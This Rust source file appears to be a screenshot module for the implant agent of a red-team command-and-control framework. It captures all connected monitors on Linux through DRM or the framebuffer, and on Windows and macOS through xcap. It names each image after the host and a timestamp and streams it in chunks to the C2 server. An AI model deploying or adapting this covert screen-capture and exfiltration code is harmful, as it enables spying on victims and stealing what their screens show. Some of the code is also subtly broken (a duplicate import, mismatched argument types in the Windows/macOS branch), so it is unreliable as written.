use alloc::sync::Arc;
use eldritch_agent::{Agent, Context};
use image::{ImageFormat, RgbaImage};
use {
    alloc::string::{String, ToString},
    alloc::vec::Vec,
    pb::c2::report_file_request,
    pb::{c2, eldritch},
    std::io::Cursor,
    std::sync::Mutex,
};

#[cfg(any(target_os = "windows", target_os = "macos"))]
use {alloc::format, image::ImageFormat, xcap::Monitor};

#[cfg(target_os = "linux")]
use {
    drm::control::{Device as Ctl, connector::State},
    framebuffer::Framebuffer,
    std::{
        fs::{File, OpenOptions},
        os::fd::{AsFd, BorrowedFd},
    },
};

#[cfg(all(any(target_os = "macos", target_os = "linux"), feature = "stdlib"))]
fn get_hostname() -> String {
    nix::unistd::gethostname()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(all(any(target_os = "macos", target_os = "linux"), not(feature = "stdlib")))]
fn get_hostname() -> String {
    std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(target_os = "windows")]
fn get_hostname() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(not(any(target_os = "windows", target_os = "macos", target_os = "linux")))]
pub fn screenshot(_agent: Arc<dyn Agent>, _context: Context) -> Result<(), String> {
    Err(
        "This OS isn't supported by the screenshot function.\nOnly windows and mac systems are supported".to_string()
    )
}

fn report_to_tavern(
    agent: &Arc<dyn Agent>,
    context: &Context,
    image: &RgbaImage,
    monitor: usize,
) -> Result<(), String> {
    // get hostname and timestamp
    let hostname = get_hostname();
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    // get the filename
    let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, monitor);

    // write PNG data
    let mut buffer = Cursor::new(Vec::new());
    image
        .write_to(&mut buffer, ImageFormat::Png)
        .map_err(|e| e.to_string())?;
    let png_data = buffer.into_inner();

    // Prepare context
    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc.clone())),
        Context::ShellTask(stc) => {
            Some(report_file_request::Context::ShellTaskContext(stc.clone()))
        }
    };

    // Error handling for the streaming thread
    let error: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));

    // Use a sync channel with bound 1 to provide backpressure
    let (tx, rx) = std::sync::mpsc::sync_channel(1);

    let chunk_size = 1024 * 1024; // 1MB
    let total_size = png_data.len();

    let png_data_clone = png_data.clone();
    let filename_clone = filename.clone();
    let context_val_clone = context_val.clone();

    // Spawn thread for streaming
    std::thread::spawn(move || {
        let mut offset = 0;
        let mut metadata_sent = false;

        loop {
            if offset >= total_size {
                break;
            }

            let end = std::cmp::min(offset + chunk_size, total_size);
            let chunk_data = png_data_clone[offset..end].to_vec();

            let metadata = if !metadata_sent {
                metadata_sent = true;
                Some(eldritch::FileMetadata {
                    path: filename_clone.clone(),
                    permissions: "644".to_string(),
                    owner: "root".to_string(),
                    group: "root".to_string(),
                    size: total_size as u64,
                    ..Default::default()
                })
            } else {
                None
            };

            let file_msg = eldritch::File {
                metadata,
                chunk: chunk_data,
            };

            let req = c2::ReportFileRequest {
                context: context_val_clone.clone(),
                chunk: Some(file_msg),
                kind: c2::ReportFileKind::Screenshot as i32,
            };

            if tx.send(req).is_err() {
                break;
            }

            offset += chunk_size;
        }
    });

    // Send stream to agent (blocking)
    agent.report_file(rx).map(|_| ())?;

    if let Some(e) = error.lock().unwrap().as_ref() {
        return Err(e.clone());
    }

    Ok(())
}

#[cfg(target_os = "linux")]
struct Card(File);
#[cfg(target_os = "linux")]
impl AsFd for Card {
    fn as_fd(&self) -> BorrowedFd<'_> {
        self.0.as_fd()
    }
}
#[cfg(target_os = "linux")]
impl drm::Device for Card {}
#[cfg(target_os = "linux")]
impl Ctl for Card {}

#[cfg(target_os = "linux")]
fn grab_drm_screenshot() -> Result<Vec<image::RgbaImage>, Box<dyn std::error::Error>> {
    let card = Card(
        OpenOptions::new()
            .read(true)
            .write(true)
            .open("/dev/dri/card0")?,
    );
    let mut out = vec![];
    for c in card.resource_handles()?.connectors() {
        let info = card.get_connector(*c, false)?;
        if info.state() != State::Connected {
            continue;
        }
        let Some(crtc) = info
            .current_encoder()
            .and_then(|e| card.get_encoder(e).ok())
            .and_then(|e| e.crtc())
        else {
            continue;
        };
        let Some(fb) = card.get_crtc(crtc)?.framebuffer() else {
            continue;
        };
        let fb = card.get_planar_framebuffer(fb)?;
        let (w, h) = fb.size();
        let pitch = fb.pitches()[0] as usize;
        let fd =
            card.buffer_to_prime_fd(fb.buffers()[0].ok_or("need root (CAP_SYS_ADMIN)")?, 0x80000)?; // O_CLOEXEC
        let map = unsafe {
            memmap2::MmapOptions::new()
                .len(pitch * h as usize)
                .map(&fd)?
        };

        // XRGB8888 (BGRX in memory) -> RGBA, skipping row padding
        let mut px = Vec::with_capacity((w * h * 4) as usize);
        for row in map.chunks(pitch).take(h as usize) {
            for p in row[..w as usize * 4].chunks(4) {
                px.extend([p[2], p[1], p[0], 255]);
            }
        }
        out.push(image::RgbaImage::from_raw(w, h, px).unwrap());
    }
    Ok(out)
}

#[cfg(target_os = "linux")]
fn screenshot_fb0() -> Result<image::RgbaImage, Box<dyn std::error::Error>> {
    let fb = Framebuffer::new("/dev/fb0")?;
    let (w, h) = (fb.var_screen_info.xres, fb.var_screen_info.yres);
    let pitch = fb.fix_screen_info.line_length as usize;
    let data = fb.read_frame(); // assumes 32bpp BGRA
    let mut px = Vec::with_capacity((w * h * 4) as usize);
    for row in data.chunks(pitch).take(h as usize) {
        for p in row[..w as usize * 4].chunks(4) {
            px.extend([p[2], p[1], p[0], 255]);
        }
    }
    Ok(image::RgbaImage::from_raw(w, h, px).unwrap())
}

#[cfg(target_os = "linux")]
pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    // use DRM if it works
    if let Ok(res) = grab_drm_screenshot() {
        for (i, monitor) in res.iter().enumerate() {
            report_to_tavern(&agent, &context, monitor, i)?;
        }
        return Ok(());
    }

    // otherwise, use framebuffer
    if let Ok(res) = screenshot_fb0() {
        report_to_tavern(&agent, &context, &res, 0)?;
        return Ok(());
    }

    // we failed if neither of these happened
    Err("Couldn't get screenshot through framebuffer or drm".to_string())
}

#[cfg(any(target_os = "windows", target_os = "macos"))]
pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    let monitors = Monitor::all().map_err(|e| e.to_string())?;

    if monitors.is_empty() {
        return Ok(());
    }

    for (i, monitor) in monitors.iter().enumerate() {
        let image = monitor.capture_image().map_err(|e| e.to_string())?;
        report_to_tavern(agent, context, &image, i)?;
    }

    Ok(())
}
